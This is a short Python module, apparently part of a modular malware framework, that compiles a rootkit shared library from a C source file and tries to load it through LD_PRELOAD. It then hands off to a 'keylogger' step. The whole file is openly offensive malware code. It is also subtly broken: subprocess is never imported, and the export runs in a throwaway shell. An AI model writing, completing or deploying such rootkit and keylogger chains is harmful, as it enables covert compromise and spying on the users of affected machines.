###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################
from pathlib import Path


###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################

def exec_bash(cmd, output=True):
    return subprocess.check_output(cmd, shell=True)


###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################

def run():
    next_action = ""
    data = "no_data"
    print("[+] Rootkit module activated...")

    exec_bash("gcc -fPIC -shared -o rootkit.so ../utils/rootkit.c -ldl\n")
    file_path = Path(__file__).resolve()
    dir_path = file_path.parent

    exec_bash(f"export LD_PRELOAD='{dir_path}/rootkit.so' \n")

    next_action = "keylogger"
    return data, next_action
